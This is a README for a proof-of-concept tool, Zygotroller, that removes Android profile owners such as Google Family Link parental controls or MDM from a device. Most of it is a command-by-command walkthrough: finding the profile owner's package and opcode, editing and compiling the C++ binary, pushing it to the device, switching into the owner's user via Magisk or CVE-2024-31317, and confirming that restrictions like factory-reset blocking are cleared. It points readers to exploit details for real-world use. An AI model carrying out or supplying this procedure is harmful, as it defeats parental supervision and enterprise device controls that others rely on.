# Zygotroller
Zygotroller is a proof-of-concept that shows how to remove an Android profile owner (used for parental controls or MDM) if you can become the user of the profile owner, for example, with CVE-2024-31317's Zygote injection bug, or Magisk.

Google's parental control system, Family Link, is shown as an example in this repo.

I won't be including how to use this with CVE-2024-31317 here because it doesn't fall under the scope of this guide. If you are interested in using this in a real world scenario, I recommend you take a look at [this repo](https://github.com/agg23/cve-2024-31317) for some blogs and details regarding how to use that CVE. At a high level, you need to rename the Zygotroll binary to `libSOMETHING.so` (replacing 'SOMETHING' with whatever you want), and include it in an APK so that SELinux allows the file to be executed. You will need developer mode+app installs enabled if planning on using this in a real world scenario.

The rest of the guide will assume you are using a rooted, supervised device with magisk. If you are not rooted, look into CVE-2024-31317.

# Using
You will need a modern-ish device running a Debian based distro to compile Zygotroller. Prebuilts may or may not be available depending on the time of reading this.

Unfortunately this relies on internal parts of Android, so you need to clone the entirety of the Android source code in order to build Zygotroller. Make sure you have at least 400gb of free space, although you will likely use less.

IMPORTANT IF USING WSL: Make sure you have a LOT of swap, or WSL will crash. I personally used 32G:
```
sudo fallocate -l 32G /swapfile
sudo chmod 600 /swapfile
sudo mkswap /swapfile
sudo swapon /swapfile
```

Now for cloning AOSP source:
```
mkdir ~/aosp
cd ~/aosp
```
`repo init --partial-clone --no-use-superproject -b android-latest-release -u https://android.googlesource.com/platform/manifest`

`repo sync -c -j8` (might take multiple tries due to ratelimits)

`source build/envsetup.sh`

`aosp_cf_x86_64_only_phone-aosp_current-eng` (if not compiling for emulator, change to use the arm version)

`cd ~/aosp/external`

`git clone https://github.com/rifting/Zygotroller`

`cd Zygotroller`

Now we need to change the values in the script to our actual profile owner and opcode for clearProfileOwner.
The profile owner can either be in the Google play services "supervision" package or in Google play services itself. Run `dpm list-owners`, my result was like so:
```
$ dpm list-owners
1 owner:
User  0: admin=com.google.android.gms.supervision/com.google.android.gms.kids.account.receiver.ProfileOwnerReceiver,ProfileOwner
```
This gives us two pieces of information we need for Zygotroller, the package name (com.google.android.gms.supervision) and the class name (com.google.android.gms.kids.account.receiver.ProfileOwnerReceiver).

Edit zygotroll.cpp with your preferred text editor and update these lines to your profile owner component:
```
    // Family Link profile owner
    std::string pkg = "com.google.android.gms.supervision";
    std::string cls = "com.google.android.gms.kids.account.receiver.ProfileOwnerReceiver";
```
Now you need to find the opcode for the clearProfileOwner function of DPM. This was "91" for me, but it varies depending on the version/type of Android you're running. To get the opcode for clearProfileOwner, I used [android-svc](https://github.com/T-vK/android-svc) with the command 

`android-svc convert 'android.app.admin.IDevicePolicyManager.clearProfileOwner("dummy")'`

The number you see in the output will be the opcode for clearprofile owner, open up zygotroll.cpp again with your preferred text editor and edit the number here, to your actual opcode:
```
    // Transaction code 91 was ClearProfileOwner for my device
    dpm->transact(91, data, &reply);
```

Now we need to compile zygotroller:

`mm`

This can take a LONG time on initial build, subsequent builds will take <1m on most modern machines.

Find your binary in `~/aosp/out/target/product/vsoc_x86_64_only/system/bin/zygotroller`

Push this to your device: `adb push ~/aosp/out/target/product/vsoc_x86_64_only/system/bin/zygotroller /data/local/tmp`

Set correct permissions `adb shell chmod +x /data/local/tmp/zygotroller`.

The family link profile owner was userid 10090 for me, AKA u0_a90
Do `dumpsys package com.google.android.gms.supervision | grep userId=`

Now switch to that user with something like Magisk or CVE-2024-31317. The username will be "u0_" + the last 2 numbers you got from the user id.

Example for magisk: `su u0_a90` (your username may or may not be different, make sure to replace mine with the correct one!)

Now run Zygotroller!
`/data/local/tmp/zygotroller`

You should see that the Family Link profile owner has been removed.

Before:
```
$ dpm list-owners
1 owner:
User  0: admin=com.google.android.gms.supervision/com.google.android.gms.kids.account.receiver.ProfileOwnerReceiver,ProfileOwner
```
```
$ abx2xml /data/system/users/0.xml -
...
<device_policy_local_restrictions>
    <restrictions_user user_id="0">
      <restrictions no_factory_reset="true" no_config_location="true" no_add_clone_profile="true" no_safe_boot="true" no_config_credentials="true" no_config_date_time="true" />
    </restrictions_user>
  </device_policy_local_restrictions>
...
```

After:
```
$ dpm list-owners
no owners
emu64xa:/ $
```
```
$ abx2xml /data/system/users/0.xml -
...
<device_policy_local_restrictions />
...
```


## Special Thanks
[gburca for BinderDemo](https://github.com/gburca/BinderDemo)
